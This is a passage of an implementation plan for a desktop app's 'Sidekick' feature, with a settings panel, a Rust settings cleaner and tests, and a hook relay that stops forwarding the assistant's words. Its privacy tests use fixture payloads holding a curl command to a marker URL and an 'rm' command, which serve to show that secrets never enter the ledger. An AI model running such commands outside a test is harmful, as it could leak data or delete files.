// The section keeps no state of its own: it reads the Sidekick settings from the host and hands every change back through the clean-up of src/sidekick/settings.ts.

import { KIND_LABELS, mutedKinds, withLocal, withSidekickOn, withUnmuted } from "../sidekick/settings.ts";
import type { SidekickSettings } from "../sidekick/core.ts";
import { h } from "../views/dom";

/** What the section needs from the window: the `sidekick` object as it is now, a place to put the new one, and (optionally) a look for a local model. */
export interface SidekickHost {
  sidekick(): SidekickSettings;
  put(next: SidekickSettings): void;
  /** The name of the local model the wording would come from, or null when there is none. Missing: the "Found" line is not shown. */
  found?(): Promise<string | null>;
}

function toggle(on: boolean, onChange: (v: boolean) => void): HTMLElement {
  const el = h("button", { class: on ? "switch on" : "switch", "aria-pressed": on });
  el.addEventListener("click", () => {
    const next = !el.classList.contains("on");
    el.classList.toggle("on", next);
    el.setAttribute("aria-pressed", String(next));
    onChange(next);
  });
  return el;
}

export function sidekickSection(host: SidekickHost): { el: HTMLElement; sync(): void } {
  const head = h("h2", {}, h("span", { text: "Sidekick" }));
  const el = h("section", {}, head);
  let foundText: string | null = null;

  function paint() {
    const s = host.sidekick();
    while (el.lastChild && el.lastChild !== head) el.removeChild(el.lastChild);
    el.append(
      h("div", { class: "row" }, h("label", { text: "Recaps and nudges" }), toggle(s.on, (v) => host.put(withSidekickOn(host.sidekick(), v)))),
      h("div", { class: "hint", text: "A short recap when you come back, and a nudge when an agent looks stuck." }),
      h("div", { class: "row" }, h("label", { text: "Nicer wording from a local model" }), toggle(s.local, (v) => host.put(withLocal(host.sidekick(), v)))),
      h("div", { class: "hint", text: "Only a model on this computer ever rewords a note." }),
    );
    if (host.found) el.append(h("div", { class: "hint", text: foundText === null ? "No local model found" : `Found: ${foundText}` }));
    const muted = mutedKinds(s);
    el.append(h("div", { class: "hint", text: muted.length ? "Muted notes" : "Nothing is muted" }));
    for (const kind of muted) {
      el.append(
        h("div", { class: "row" },
          h("label", { text: KIND_LABELS[kind] }),
          h("button", { text: "Unmute", onclick: () => host.put(withUnmuted(host.sidekick(), kind)) }),
        ),
      );
    }
    el.append(h("div", { class: "hint", text: "Permission explanations are always on." }));
  }

  paint();
  if (host.found) void host.found().then((name) => { foundText = name; paint(); });
  return { el, sync: paint };
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/core/state.ts", r'''import type { Kitten, KittenEvent } from "../cat/kittens.ts";
''', r'''import type { Kitten, KittenEvent } from "../cat/kittens.ts";
import { cleanSidekickSettings } from "../sidekick/core.ts";
import type { SidekickSettings } from "../sidekick/core.ts";
''')
edit("windows/src/core/state.ts", r'''  cat: CatBlock;
}
''', r'''  cat: CatBlock;
  /**
   * The Sidekick (sub-project F1), clean (sidekick/settings.ts): the master switch "Recaps and nudges", the local-wording switch and how often each kind of note was
   * dismissed (two mute it). The permission line and the risk badge have no switch.
   */
  sidekick: SidekickSettings;
}
''')
edit("windows/src/core/state.ts", r'''  cat: defaultCatBlock(),
};
''', r'''  cat: defaultCatBlock(),
  sidekick: cleanSidekickSettings(null),
};
''')

edit("windows/src/settings/main.ts", r'''import { cleanCatBlock } from "../cat/display";
import { catSection } from "./cat";
''', r'''import { cleanCatBlock } from "../cat/display";
import { cleanSidekickSettings } from "../sidekick/core.ts";
import { catSection } from "./cat";
import { sidekickSection } from "./sidekick";
''')
edit("windows/src/settings/main.ts", r'''  clear(root);
  root.append(
''', r'''  settings.sidekick = cleanSidekickSettings(settings.sidekick);
  const sidekick = sidekickSection({
    sidekick: () => settings.sidekick,
    put: (next) => {
      settings.sidekick = next;
      void save();
      sidekick.sync();
    },
  });

  clear(root);
  root.append(
''')
edit("windows/src/settings/main.ts", r'''    cat.el,
    generalSection(),
''', r'''    cat.el,
    sidekick.el,
    generalSection(),
''')
edit("windows/src/settings/main.ts", r'''    settings = { ...settings, ...s };
    cat.sync();
''', r'''    settings = { ...settings, ...s };
    cat.sync();
    sidekick.sync();
''')
PY
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 16`, `ℹ pass 16`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

- [ ] **Step 3: The Rust twin, and the keep at every save**

`sidekick_settings.rs` carries its own tests: it replays `settings-cases.json` (the contract's fixture) and the odd numbers a hand-edited file can hold (`1e300`, `2.0`, `-0.0`, a count past `u64`) the way JavaScript reads them. `settings.rs` gets the field with `#[serde(default = ...)]` (a file from before F1 loads), the default, and one line in `sanitized`; its two new tests write a file, load it back, save again, and plant six kinds of bad object.

```bash
mkdir -p windows/src-tauri/src
cat > windows/src-tauri/src/sidekick_settings.rs <<'EOF'
// The Sidekick settings (sub-project F1, docs/SIDEKICK-CONTRACT.md, `cleanSidekickSettings`): the Rust twin of shared/sidekick-core.js's clean-up, which keeps the
// `sidekick` object of settings.json — `{on, local, dismissals}` — to what the contract allows. The cleaner has no state and no I/O; `settings::sanitized` runs the
// object through it on load and on every save, so a hand-edited or half-written value can never fail the file or reach the island, and the object is never dropped
// by a save that only knew about other settings.

use serde_json::{json, Map, Value};

/// The five kinds a note can be: frozen contract values, in this order. A stored count for any other word is dropped.
pub const KINDS: [&str; 5] = ["recap", "stuck.loop", "stuck.errors", "stuck.waiting", "stuck.silent"];
/// A kind dismissed this many times is muted.
pub const MUTE_AT: u64 = 2;

/// A stored count: a whole number from 1 up stays (at most `MUTE_AT`), anything else (text, a fraction, a negative, null, a boolean) is 0. `2.0` is a whole number, as it
/// is in JavaScript.
fn count(v: Option<&Value>) -> u64 {
    v.and_then(Value::as_f64)
        .filter(|f| f.is_finite() && f.fract() == 0.0 && *f > 0.0)
        .map(|f| f.min(MUTE_AT as f64) as u64)
        .unwrap_or(0)
}

/// The dismissals as they are kept: every kind once, in order, each a count from 0 to 2. Unknown kinds go. Never panics.
pub fn clean_dismissals(raw: &Value) -> Value {
    let none = Map::new();
    let r = raw.as_object().unwrap_or(&none);
    let mut out = Map::new();
    for kind in KINDS {
        out.insert(kind.to_string(), json!(count(r.get(kind))));
    }
    Value::Object(out)
}

/// Everything the Sidekick saves, cleaned: `{ on, local, dismissals }`. `on` and `local` are on unless they are the boolean `false`; anything else (the text "false", 0,
/// null) is on. Cleaning twice is cleaning once. Never panics.
pub fn clean_sidekick(raw: &Value) -> Value {
    let none = Map::new();
    let r = raw.as_object().unwrap_or(&none);
    json!({
        "on": r.get("on") != Some(&Value::Bool(false)),
        "local": r.get("local") != Some(&Value::Bool(false)),
        "dismissals": clean_dismissals(r.get("dismissals").unwrap_or(&Value::Null)),
    })
}

/// What a fresh install holds: everything on, nothing dismissed.
pub fn default_value() -> Value {
    clean_sidekick(&Value::Null)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn fixture(name: &str) -> Value {
        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../tests/fixtures/sidekick").join(name);
        let text = std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("read {}: {e}", path.display()));
        serde_json::from_str(&text).unwrap_or_else(|e| panic!("parse {}: {e}", path.display()))
    }

    #[test]
    fn the_clean_up_replays_the_fixture() {
        let fx = fixture("settings-cases.json");
        let kinds: Vec<&str> = fx["kinds"].as_array().unwrap().iter().map(|k| k.as_str().unwrap()).collect();
        assert_eq!(kinds, KINDS, "the five kinds are the contract's, in its order");
        let cases = fx["cases"].as_array().unwrap();
        assert!(cases.len() >= 15, "{} cases", cases.len());
        for c in cases {
            assert_eq!(clean_sidekick(&c["raw"]), c["clean"], "{}", c["name"]);
        }
    }

    #[test]
    fn nothing_stored_is_everything_on_and_nothing_dismissed() {
        let d = default_value();
        assert_eq!(d["on"], true);
        assert_eq!(d["local"], true);
        for k in KINDS {
            assert_eq!(d["dismissals"][k], 0, "{k}");
        }
        assert_eq!(d["dismissals"].as_object().unwrap().len(), 5);
    }

    #[test]
    fn bad_values_are_cleaned_and_unknown_words_are_dropped() {
        let raw = json!({"on": "false", "local": 0, "dismissals": {"recap": 7, "stuck.loop": -3, "stuck.errors": 1.5, "stuck.waiting": "2", "stuck.silent": 2.0, "bogus": 2}, "extra": 1});
        let c = clean_sidekick(&raw);
        assert_eq!(c["on"], true, "the text false is not the boolean");
        assert_eq!(c["local"], true, "zero is not the boolean");
        assert_eq!(c["dismissals"], json!({"recap": 2, "stuck.loop": 0, "stuck.errors": 0, "stuck.waiting": 0, "stuck.silent": 2}));
        assert!(c.get("extra").is_none() && c["dismissals"].get("bogus").is_none());
        for odd in [json!(null), json!(7), json!("x"), json!([1]), json!({"dismissals": [1]}), json!({"dismissals": "recap"})] {
            let c = clean_sidekick(&odd);
            assert_eq!((c["on"].clone(), c["dismissals"]["recap"].clone()), (json!(true), json!(0)), "{odd}");
        }
        assert_eq!(clean_sidekick(&json!({"on": false, "local": false}))["on"], false);
        assert_eq!(clean_sidekick(&json!({"on": false, "local": false}))["local"], false);
    }

    #[test]
    fn cleaning_twice_is_cleaning_once() {
        for raw in [json!(null), json!({"on": false, "dismissals": {"recap": 9, "stuck.loop": 1}}), json!({"dismissals": {"x": 1}}), json!([])] {
            let once = clean_sidekick(&raw);
            assert_eq!(clean_sidekick(&once), once, "{raw}");
        }
    }

    #[test]
    fn a_huge_or_odd_number_is_a_count_the_way_javascript_reads_it() {
        let c = clean_sidekick(&json!({"dismissals": {"recap": 1e300, "stuck.loop": 18446744073709551615u64, "stuck.errors": 0.0, "stuck.waiting": -0.0, "stuck.silent": 1.0000000000000002}}));
        assert_eq!(c["dismissals"], json!({"recap": 2, "stuck.loop": 2, "stuck.errors": 0, "stuck.waiting": 0, "stuck.silent": 0}));
    }
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src-tauri/src/lib.rs", r'''mod settings;
mod tray;
''', r'''mod settings;
mod sidekick_settings;
mod tray;
''')
edit("windows/src-tauri/src/settings.rs", r'''    #[serde(default = "crate::cat_settings::block_default")]
    pub cat: serde_json::Value,
}
''', r'''    #[serde(default = "crate::cat_settings::block_default")]
    pub cat: serde_json::Value,
    /// The Sidekick settings (sub-project F1): `{on, local, dismissals}`. Held as a JSON value, like `cat`, so that one bad field cannot fail the whole file; `sanitized` runs
    /// it through `sidekick_settings::clean_sidekick` on load and on every save, and a file from before F1 gets everything on and nothing dismissed.
    #[serde(default = "crate::sidekick_settings::default_value")]
    pub sidekick: serde_json::Value,
}
''')
edit("windows/src-tauri/src/settings.rs", r'''            cat: crate::cat_settings::block_default(),
        }
''', r'''            cat: crate::cat_settings::block_default(),
            sidekick: crate::sidekick_settings::default_value(),
        }
''')
edit("windows/src-tauri/src/settings.rs", r'''    settings.cat = crate::cat_settings::clean_cat_block(&settings.cat);
    settings
''', r'''    settings.cat = crate::cat_settings::clean_cat_block(&settings.cat);
    settings.sidekick = crate::sidekick_settings::clean_sidekick(&settings.sidekick);
    settings
''')
edit("windows/src-tauri/src/settings.rs", r'''        assert_eq!(cleaned.cat["agentCats"], serde_json::json!({"agent_x": "snow"}));
        let backups = std::fs::read_dir(&dir).unwrap().filter(|e| e.as_ref().unwrap().file_name().to_string_lossy().starts_with("settings.json.bad-")).count();
        assert_eq!(backups, 0);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
''', r'''        assert_eq!(cleaned.cat["agentCats"], serde_json::json!({"agent_x": "snow"}));
        let backups = std::fs::read_dir(&dir).unwrap().filter(|e| e.as_ref().unwrap().file_name().to_string_lossy().starts_with("settings.json.bad-")).count();
        assert_eq!(backups, 0);
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The Sidekick settings are an object of their own beside the `cat` block: a save keeps them, a load gives them back, and a settings file from before F1 gets the defaults.
    #[test]
    fn the_sidekick_settings_survive_a_save_a_load_and_a_round_trip() {
        let dir = std::env::temp_dir().join(format!("notchmeow-sidekick-keys-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("settings.json");
        let mut s = Settings::default();
        s.sidekick = serde_json::json!({"on": false, "local": true, "dismissals": {"recap": 2, "stuck.loop": 1}});
        // `save_settings` cleans what the webview sends, stores it and writes it: the same three steps, with the file under a temporary folder.
        let sent = sanitized(s);
        assert_eq!(sent.sidekick["on"], false);
        std::fs::write(&path, serde_json::to_vec_pretty(&sent).unwrap()).unwrap();
        let back = load_from(&path);
        assert_eq!(back.sidekick, sent.sidekick, "what was saved is what loads");
        assert_eq!(back.sidekick["dismissals"], serde_json::json!({"recap": 2, "stuck.loop": 1, "stuck.errors": 0, "stuck.waiting": 0, "stuck.silent": 0}));
        let again: Settings = serde_json::from_value(serde_json::to_value(&back).unwrap()).unwrap();
        assert_eq!(sanitized(again).sidekick, back.sidekick, "a second round trip changes nothing");
        // A save that changes only other settings still carries the object: it is part of `Settings`, so a clean-up of anything else never drops it.
        let mut other = back.clone();
        other.sound_enabled = !other.sound_enabled;
        assert_eq!(sanitized(other).sidekick, sent.sidekick);
        // A file from before F1 has no such object: everything is on and nothing is dismissed.
        std::fs::write(&path, format!("{OLD_FILE}}}")).unwrap();
        assert_eq!(load_from(&path).sidekick, crate::sidekick_settings::default_value());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A typed `sidekick` field would reject every one of these, and `load` would then move the whole file aside.
    #[test]
    fn one_bad_field_in_the_sidekick_object_never_fails_the_settings_file() {
        let dir = std::env::temp_dir().join(format!("notchmeow-bad-sidekick-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("settings.json");
        for sidekick in ["5", r#""junk""#, "[1,2]", "null", r#"{"on":"no","local":[],"dismissals":"all"}"#, r#"{"dismissals":{"recap":"x","stuck.loop":-1,"nope":2},"extra":1}"#] {
            std::fs::write(&path, format!(r#"{OLD_FILE},"sidekick":{sidekick}}}"#)).unwrap();
            let s = load_from(&path);
            assert!(!s.sound_enabled && s.screen == "cursor", "the rest of the file is kept: {sidekick}");
            assert_eq!(s.sidekick, crate::sidekick_settings::default_value(), "{sidekick}");
            assert!(path.exists(), "the file is not moved aside: {sidekick}");
        }
        let backups = std::fs::read_dir(&dir).unwrap().filter(|e| e.as_ref().unwrap().file_name().to_string_lossy().starts_with("settings.json.bad-")).count();
        assert_eq!(backups, 0);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
''')
PY
```

```bash
windows/scripts/cargo-linux.sh test -p notchmeow sidekick --target-dir /repo/windows/target/f1-tauri
```

Expected: `the_clean_up_replays_the_fixture`, `the_sidekick_settings_survive_a_save_a_load_and_a_round_trip`, `one_bad_field_in_the_sidekick_object_never_fails_the_settings_file`, `test result: ok`.

- [ ] **Step 4: Look at the section**

Start the dev server (see "How to run"), then open the Settings page and scroll to Sidekick:

```bash
( cd .claude/checkpoints/f1-tauri && playwright-cli -s=f1 open "http://127.0.0.1:14711/settings.html" > /dev/null; playwright-cli -s=f1 resize 620 700 > /dev/null; playwright-cli -s=f1 eval "[...document.querySelectorAll('h2')].find(e=>e.textContent==='Sidekick').scrollIntoView()" > /dev/null; playwright-cli -s=f1 screenshot --filename=settings-sidekick.png > /dev/null; echo settings-sidekick.png )
```

Expected: `settings-sidekick.png`.

Say what you saw: the heading **Sidekick**, "Recaps and nudges" and "Nicer wording from a local model" as switches (on), each with one grey line under it, **"Nothing is muted"** and **"Permission explanations are always on."**, in the window's own look, between Cat and General. (The "Found: {model}" line appears in Task 12.)

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src/sidekick windows/src/settings windows/src/core/state.ts windows/src-tauri/src windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): the sidekick settings: helpers, the Rust twin kept at every save, Settings > Sidekick

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 3: What the relay forwards

The spec: the sidekick keeps no `transcript_path` and no agent text, and "F1 needs none of the dropped parts". The relay already drops `tool_response` and `transcript_path`. **The owner's answer:** it also drops `last_assistant_message` and `prompt_response`, so what the assistant said never crosses the pipe at all. The island never reads them (Windows reads `message` on a Stop, which Claude Code does not send), so nothing changes for it. The relay keeps forwarding `prompt` (the island's step row reads its first 60 characters), `message`, `tool_input` (the card shows the command or the path) and everything else it forwards today.

**Files:**
- Modify: `windows/hook/src/main.rs` (`DROPPED_FIELDS` and one test), `windows/scripts/cat-tests/kitten-wiring.test.mjs` (the old pin that lists the two dropped fields)

**Interfaces:**
- Consumes: nothing.
- Produces: a relay that never forwards `tool_response`, `transcript_path`, `last_assistant_message` or `prompt_response`.

- [ ] **Step 1: Write the Rust test**

Its payload plants a marker in each of the four fields, and checks that what the island and the sidekick do read still passes.

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/hook/src/main.rs", r'''    /// Subagent kittens (sub-project B): the island reads `agent_id` and `agent_type` from tool, permission and SubagentStart/SubagentStop events. The relay only
    /// drops `tool_response` and `transcript_path`, so both pass through.
''', r'''    /// Subagent kittens (sub-project B): the island reads `agent_id` and `agent_type` from tool, permission and SubagentStart/SubagentStop events. The relay only
    /// drops the big and the private fields (`DROPPED_FIELDS`), so both pass through.
''')
edit("windows/hook/src/main.rs", r'''    #[test]
    fn a_payload_the_relay_cannot_use_forwards_nothing() {
''', r'''    /// The Sidekick (sub-project F1) keeps no agent text and never reads a transcript: the relay does not carry them, so a leak test has nothing to find on this side of the pipe.
    #[test]
    fn the_assistants_words_and_the_transcript_never_cross_the_pipe() {
        let stdin = r#"{"hook_event_name":"Stop","session_id":"c-1","cwd":"C:/work/app","last_assistant_message":"SECRET-WORDS","prompt_response":"SECRET-REPLY","transcript_path":"C:/Users/me/.claude/SECRET-TRANSCRIPT.jsonl","tool_response":{"stdout":"SECRET-OUT"}}"#;
        let event = shape(stdin, &["Stop"], &[]).unwrap();
        for secret in ["SECRET-WORDS", "SECRET-REPLY", "SECRET-TRANSCRIPT", "SECRET-OUT"] {
            assert!(!event.line.contains(secret), "{secret} crossed the pipe: {}", event.line);
        }
        let sent = forwarded(&event);
        assert_eq!((&sent["hook_event_name"], &sent["session_id"], &sent["cwd"]), (&serde_json::json!("Stop"), &serde_json::json!("c-1"), &serde_json::json!("C:/work/app")));
        // What the island and the Sidekick do read still passes: the prompt (the island's step row), the message of a Notification, the tool and its input.
        let tool = r#"{"hook_event_name":"PostToolUse","session_id":"c-1","prompt":"fix it","message":"hello","tool_name":"Bash","tool_input":{"command":"ls"}}"#;
        let sent = forwarded(&shape(tool, &["PostToolUse"], &[]).unwrap());
        assert_eq!((&sent["prompt"], &sent["message"], &sent["tool_input"]["command"]), (&serde_json::json!("fix it"), &serde_json::json!("hello"), &serde_json::json!("ls")));
    }

    #[test]
    fn a_payload_the_relay_cannot_use_forwards_nothing() {
''')
PY
```

```bash
windows/scripts/cargo-linux.sh test -p notchmeow-hook the_assistants --target-dir /repo/windows/target/f1-tauri
```

Expected (a failure, exit non-zero): `the_assistants_words_and_the_transcript_never_cross_the_pipe`, `SECRET-WORDS crossed the pipe`.

- [ ] **Step 2: Change the list, and the old pin**

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/hook/src/main.rs", r'''/// Fields that are pointless to forward and can be enormous (a whole file read,
/// a full command output). The island never shows them.
const DROPPED_FIELDS: &[&str] = &["tool_response", "transcript_path"];
''', r'''/// Fields that are pointless to forward and can be enormous (a whole file read,
/// a full command output). The island never shows them. `last_assistant_message` and
/// `prompt_response` are what the assistant said: the island never reads them either, and the
/// Sidekick (sub-project F1) keeps no agent text, so the words never cross the pipe at all.
const DROPPED_FIELDS: &[&str] = &["tool_response", "transcript_path", "last_assistant_message", "prompt_response"];
''')
edit("windows/scripts/cat-tests/kitten-wiring.test.mjs", r'''/DROPPED_FIELDS: &\[&str\] = &\["tool_response", "transcript_path"\];/, "the relay drops only these two");''', r'''/DROPPED_FIELDS: &\[&str\] = &\["tool_response", "transcript_path", "last_assistant_message", "prompt_response"\];/, "the relay drops the big and the private fields, and the agent_id and agent_type are not among them");''')
PY
```

```bash
windows/scripts/cargo-linux.sh test -p notchmeow-hook --target-dir /repo/windows/target/f1-tauri
```

Expected: `test result: ok`, `the_assistants_words_and_the_transcript_never_cross_the_pipe`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

- [ ] **Step 3: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/hook/src/main.rs windows/scripts/cat-tests/kitten-wiring.test.mjs
git commit -F - <<'MSG'
feat(sidekick): the relay no longer forwards what the assistant said

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

---

# Stage 2: the ledger, away and back, and the notes

### Task 4: The ledger, fed before the gate

**Files:**
- Create: `windows/src/sidekick/ledger.ts`, `platform.ts`, `hub.ts`, `controller.ts`, `appenv.ts`, `windows/scripts/sidekick-tests/ledger.test.mjs`
- Modify: `windows/src/island/hooks.ts` (the feed), `windows/src/island/island.ts` (the click on a card), `windows/src/main.ts` (the installation)

**Interfaces:**
- Consumes: Task 1's `eventFrom`, `ledgerApply`, `approvalAnsweredEvent`, `markNudged`, `ledgerPrune`, `liveSessions`, `emptyLedger`, `Ledger`, `Session`, `SidekickEvent`, `Platform`.
- Produces: `class SessionLedger` (`feed(payload, now) → SidekickEvent | null`, `answered(agentId, sessionId, now)`, `markNudged(key, now)`, `prune(now)`, `snapshot: Ledger`, `live: Session[]`, `clear()`); `platformName(userAgent?) → "windows" | "linux"`; `Hub: { sk: Sidekick | null }`; `interface SidekickEnv { now(): number; platform }` and `class Sidekick` with `ledger`, `hook(payload)` and `approvalAnswered(agentId, sessionId)` (later tasks add to both); `sidekickEnv(): SidekickEnv` (`appenv.ts`); `window.__nm.sk` in the dev server.

The ledger is the only memory the sidekick has. It holds what `eventFrom` and `ledgerApply` keep and nothing else: it **never sees** the prompt, the assistant's text or a transcript because the contract's adapter does not read them, and the leak test of Task 13 proves it again at the end. `Sidekick.hook` swallows every error: **an exception here must never reach the island's hook handler**, whose next lines acknowledge the approval card.

- [ ] **Step 1: Write the test**

It feeds Windows-shaped payloads (backslash paths, a long command cut by the relay), plants markers, checks the caps and the 30-minute and 12-hour ends, feeds 3000 random payloads, and pins where the app calls the ledger: **after a chat's own Claude Code run is set aside and before the one-card gate and the decline of an external agent's request**.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/ledger.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import { SessionLedger } from "../../src/sidekick/ledger.ts";
import { Sidekick } from "../../src/sidekick/controller.ts";
import { platformName } from "../../src/sidekick/platform.ts";
import { Hub } from "../../src/sidekick/hub.ts";
import { source } from "./util.mjs";

const MIN = 60_000;
const hook = (name, extra = {}) => ({ hook_event_name: name, session_id: "S1", cwd: "C:\\work\\app", ...extra });
const SECRETS = ["SECRET-PROMPT", "SECRET-OUT", "SECRET-WORDS", "SECRET-BODY", "SECRET-DIR", "SECRET-CMD", "SECRET-TRANSCRIPT", "SECRET-REPLY"];

test("a hook event goes into the ledger as a basename, a command key and counts; the event is handed back", () => {
  const l = new SessionLedger();
  const ev = l.feed(hook("PostToolUse", { tool_name: "Edit", tool_input: { file_path: "C:\\work\\app\\src\\main.ts", old_string: "a", new_string: "b" } }), 5000);
  assert.equal(ev.kind, "tool");
  assert.equal(ev.file, "main.ts");
  assert.equal(ev.project, "app");
  const s = l.snapshot.sessions[0];
  assert.deepEqual([s.agentId, s.sessionId, s.state, s.project], ["integration_claude", "S1", "thinking", "app"]);
  assert.deepEqual(s.ring.map((r) => [r.kind, r.tool, r.file, r.ok]), [["tool", "Edit", "main.ts", true]]);
  assert.equal(l.live.length, 1);
});

test("an event the ledger does not know, and anything that is not a payload, change nothing and throw nothing", () => {
  const l = new SessionLedger();
  for (const p of [null, undefined, 7, "x", [], {}, hook("Elicitation"), hook("")]) assert.equal(l.feed(p, 1000), null, JSON.stringify(p));
  assert.equal(l.feed(hook("Stop"), Number.NaN), null);
  assert.deepEqual(l.snapshot.sessions, []);
});

test("nothing secret is kept: not the prompt, the assistant's words, a transcript, a tool's output, a file's body, a command, a parent folder", () => {
  const l = new SessionLedger();
  const cwd = `C:\\Users\\${SECRETS[4]}\\app`;
  l.feed(hook("UserPromptSubmit", { prompt: SECRETS[0], transcript_path: `C:\\Users\\me\\.claude\\${SECRETS[6]}.jsonl`, cwd }), 1000);
  l.feed(hook("PostToolUse", { tool_name: "Bash", tool_input: { command: `echo ${SECRETS[5]}` }, tool_response: { stdout: SECRETS[1] }, cwd }), 2000);
  l.feed(hook("PostToolUse", { tool_name: "Write", tool_input: { file_path: `${cwd}\\a.js`, content: SECRETS[3] }, cwd }), 3000);
  l.feed(hook("PermissionRequest", { tool_name: "Bash", tool_input: { command: `curl https://${SECRETS[5]}` }, cwd }), 4000);
  l.feed(hook("Stop", { last_assistant_message: SECRETS[2], prompt_response: SECRETS[7], message: SECRETS[2], cwd }), 5000);
  const text = JSON.stringify(l.snapshot);
  for (const secret of SECRETS) assert.ok(!text.includes(secret), `${secret} is in the ledger`);
  assert.equal(l.snapshot.sessions[0].project, "app");
});

test("a payload the Windows relay cut at 2000 bytes (a long command, a long path) still feeds the ledger and keeps only a name and a key", () => {
  const l = new SessionLedger();
  const long = `${"x".repeat(2000)}…`;
  l.feed(hook("PreToolUse", { tool_name: "Bash", tool_input: { command: long } }), 1000);
  l.feed(hook("PostToolUse", { tool_name: "Edit", tool_input: { file_path: `C:\\${"d\\".repeat(900)}file.ts…` } }), 2000);
  const s = l.snapshot.sessions[0];
  assert.ok(JSON.stringify(s).length < 3000, "the ledger does not grow with the command");
  assert.ok(s.ring.every((r) => r.target.length <= 61 || r.target.startsWith("Bash#")));
});

test("a session ends at SessionEnd plus 30 minutes, or 12 hours after its last event, and at most 8 are kept", () => {
  const l = new SessionLedger();
  l.feed(hook("SessionStart"), 0);
  l.feed(hook("SessionEnd"), 10 * MIN);
  l.prune(10 * MIN + 30 * MIN);
  assert.equal(l.snapshot.sessions.length, 1, "30 minutes after the end it is still there");
  l.prune(10 * MIN + 30 * MIN + 1);
  assert.equal(l.snapshot.sessions.length, 0);
  l.feed(hook("SessionStart", { session_id: "quiet" }), 0);
  l.prune(12 * 60 * MIN);
  assert.equal(l.snapshot.sessions.length, 1);
  l.prune(12 * 60 * MIN + 1);
  assert.equal(l.snapshot.sessions.length, 0);
  for (let i = 0; i < 12; i++) l.feed(hook("PreToolUse", { session_id: `s${i}`, tool_name: "Bash", tool_input: { command: "ls" } }), 1000 + i);
  assert.equal(l.snapshot.sessions.length, 8);
  assert.ok(l.snapshot.sessions.every((s) => s.ring.length <= 40));
});

test("the ledger it hands out is never changed in place, and approvals answered and nudges marked go through the core", () => {
  const l = new SessionLedger();
  l.feed(hook("PermissionRequest", { tool_name: "Bash", tool_input: { command: "rm x" } }), 1000);
  const before = JSON.stringify(l.snapshot);
  assert.equal(l.snapshot.sessions[0].state, "approval");
  const held = l.snapshot;
  l.answered("integration_claude", "S1", 2000);
  assert.equal(JSON.stringify(held), before, "the old snapshot is untouched");
  assert.equal(l.snapshot.sessions[0].pendingApprovalAt, null);
  l.markNudged(l.snapshot.sessions[0].key, 3000);
  assert.equal(l.snapshot.sessions[0].nudgedAt, 3000);
  l.clear();
  assert.deepEqual(l.snapshot.sessions, []);
});

test("the Sidekick feeds the ledger and never throws into the island's hook handler", () => {
  let t = 1000;
  const sk = new Sidekick({ now: () => t, platform: "windows" });
  sk.hook(hook("PreToolUse", { tool_name: "Bash", tool_input: { command: "ls" } }));
  assert.equal(sk.ledger.snapshot.sessions.length, 1);
  const hostile = {};
  Object.defineProperty(hostile, "hook_event_name", { get() { throw new Error("boom"); } });
  assert.doesNotThrow(() => sk.hook(hostile));
  assert.doesNotThrow(() => sk.hook(null));
  assert.doesNotThrow(() => sk.approvalAnswered(undefined, undefined));
  t = 2000;
  sk.approvalAnswered("integration_claude", "S1");
  assert.equal(sk.ledger.snapshot.sessions[0].ring.at(-1).kind, "approvalAnswered");
});

test("a fuzz of hook payloads never throws and never lets the ledger grow past its caps", () => {
  let seed = 11;
  const rnd = (n) => { seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0; return seed % n; };
  const names = ["SessionStart", "UserPromptSubmit", "PreToolUse", "PostToolUse", "PostToolUseFailure", "PermissionRequest", "Notification", "Stop", "StopFailure", "SubagentStart", "SubagentStop", "SessionEnd", "Bogus"];
  const tools = ["Bash", "Edit", "Write", "Read", "Grep", "mcp__x__y", "", undefined, 7];
  const l = new SessionLedger();
  for (let i = 0; i < 3000; i++) {
